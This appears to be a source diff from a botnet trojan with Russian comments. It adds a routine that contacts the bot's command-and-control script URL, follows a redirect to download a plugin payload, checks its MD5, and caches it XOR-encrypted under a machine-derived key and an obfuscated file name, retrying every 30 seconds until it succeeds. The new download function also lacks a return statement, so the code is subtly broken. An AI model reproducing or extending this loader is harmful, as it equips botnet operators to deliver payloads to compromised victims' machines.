@@ -10,12 +10,11 @@
 
 #include <ShlObj.h>
 #include "Installer.h"
-#include "BotCore.h"
 #include "StrConsts.h"
-#include "BotClasses.h"
 #include "BotUtils.h"
-#include "Plugins.h"
+#include "BotCore.h"
 #include "Crypt.h"
+#include "MD5.h"
 
 //---------------------------------------------------------------------------
 #include "BotDebug.h"
@@ -135,13 +134,120 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 
 
 //----------------------------------------------
+//  CryptBotPlug - Функция шифрует/дешифрует
+//                 плагина бота
+//----------------------------------------------
+BOOL WINAPI CryptBotPlug(LPVOID Buf, DWORD BufSize)
+{
+	if (!Buf || !BufSize) return FALSE;
+
+	// Получаем пароль
+	PCHAR Pass = MakeMachineID();
+	if (!Pass) return FALSE;
+
+    XORCrypt::Crypt(Pass, (LPBYTE)Buf, BufSize);
+
+	STR::Free(Pass);
+	return TRUE;
+}
+
+
+//----------------------------------------------
 //  GetBotPlugFileName - Функция возвращает имя
 //  файла, для хранения плагина
 //----------------------------------------------
 string GetBotPlugFileName()
 {
-    return BOT::MakeFileName(NULL, GetStr(EStrBotPlug).t_str());
+	string Path = BOT::MakeWorkPath();
+	PCHAR Name = UIDCrypt::CryptFileName(GetStr(EStrBotPlug).t_str(), false);
+	Path += Name;
+	STR::Free(Name);
+    return Path;
 }
+
+
+//----------------------------------------------
+//  DownloadBotPlug - Функци загружает плагин
+//  бота
+//----------------------------------------------
+bool DoDownloadBotPlug(const string& FileName, LPBYTE *Buf, DWORD *BufSize)
+{
+	// Скачивание плагина bot.plug организовываем вне
+	// системы загрузки плагинов
+	if (Buf)     *Buf = NULL;
+	if (BufSize) *BufSize = 0;
+
+	PCHAR URL = GetBotScriptURL(SCRIPT_PLUGIN);
+	if (STRA::IsEmpty(URL)) return false;
+
+	#ifdef CryptHTTPH
+		TCryptHTTP HTTP;
+		HTTP.Password = GetMainPassword();
+	#else
+		THTTP HTTP;
+	#endif
+	HTTP.CheckOkCode = false;
+
+	TBotStrings Fields;
+	Fields.AddValue("name", GetStr(EStrBotPlug));
+
+	// Плучаем адрес плагина
+	bool Result = false;
+	string Doc;
+	if (HTTP.Post(URL, &Fields, Doc) && HTTP.Response.Code == 302)
+	{
+		// Получаем адес и загужаем плагин
+		string PlugURL = HTTP.Response.Location;
+		string MD5     = HTTP.Response.MD5;
+
+		TBotMemoryStream Stream;
+		HTTP.CheckOkCode = true;
+		if (HTTP.Get(PlugURL.t_str(), &Stream))
+		{
+			if (!MD5.IsEmpty())
+			{
+				// проверяем мд5 хэш загруженного документа
+				string PlugMD5 = CalcMd5SummFromBuffer(Stream.Memory(), Stream.Size());
+				Result = PlugMD5 == MD5;
+			}
+			else
+				Result = true;
+
+			if (Result)
+			{
+				// Копиуем файл
+				if (BufSize) *BufSize = Stream.Size();
+				if (Buf)
+				{
+					*Buf = (LPBYTE)MemAlloc(Stream.Size());
+					m_memcpy(*Buf, Stream.Memory(), Stream.Size());
+				}
+
+				// Кэшируем файл
+				if (!FileName.IsEmpty())
+				{
+					CryptBotPlug(Stream.Memory(), Stream.Size());
+					File::WriteBufferA(FileName.t_str(), Stream.Memory(), Stream.Size());
+				}
+            }
+		}
+
+	}
+	STR::Free(URL);
+}
+
+
+bool DownloadBotPlug(const string& FileName, LPBYTE *Buf, DWORD *BufSize)
+{
+	bool Result = false;
+	while (!Result)
+	{
+		Result = DoDownloadBotPlug(FileName, Buf, BufSize);
+		if (!Result) pSleep(30000);
+	}
+	return Result;
+}
+
 
 
 //----------------------------------------------
@@ -158,6 +264,17 @@ BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
 
 	if (!Buf) return FALSE;
 	*Buf = NULL;
+
+
+	// Заглушка на время тестов
+//	DWORD Sz = 0;
+//	*Buf = File::ReadToBufferA("c:\\bot.plug", Sz);
+//	if (BufSize) *BufSize = Sz;
+//	return *Buf != NULL;
+
+
+
+
 
 	// Пытаемся загрузить плагин из файла
 	string FileName = GetBotPlugFileName();
@@ -191,17 +308,8 @@ BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
 
 
 	// Загружаем плагин
-	FileData = Plugin::DownloadEx(GetStr(EStrBotPlug).t_str(), NULL, &FileSize, true, false, NULL);
-	if (!FileData) return FALSE;
-
-	// кэшируем файл
-	LPBYTE CacheBuf = (LPBYTE)MemAlloc(FileSize);
-	m_memcpy(CacheBuf, FileData, FileSize);
-	if (CryptBotPlug(CacheBuf, FileSize))
-	{
-		File::WriteBufferA(FileName.t_str(), CacheBuf, FileSize);
-	}
-	MemFree(CacheBuf);
+	if (!DownloadBotPlug(FileName, &FileData, &FileSize))
+		return FALSE;
 
 	// Возвращаем результат
 	*Buf = FileData;
@@ -218,15 +326,7 @@ BOOL WINAPI UpdateBotPlug()
 {
 	string FileName = GetBotPlugFileName();
 	DeleteFileA(FileName.t_str());
-	DWORD Sz;
-	LPVOID Buf;
-	if (LoadBotPlug(&Buf, &Sz))
-	{
-        MemFree(Buf);
-        return TRUE;
-    }
-
-	return FALSE;
+	return DownloadBotPlug(FileName, NULL, NULL);
 }
 
 
@@ -243,20 +343,4 @@ VOID WINAPI FreeBotPlug(LPVOID Buf)
 }
 
 
-//----------------------------------------------
-//  CryptBotPlug - Функция шифрует/дешифрует
-//                 плагина бота
-//----------------------------------------------
-BOOL WINAPI CryptBotPlug(LPVOID Buf, DWORD BufSize)
-{
-	if (!Buf || !BufSize) return FALSE;
 
-	// Получаем пароль
-	PCHAR Pass = MakeMachineID();
-	if (!Pass) return FALSE;
-
-    XORCrypt::Crypt(Pass, (LPBYTE)Buf, BufSize);
-
-	STR::Free(Pass);
-	return TRUE;
-}
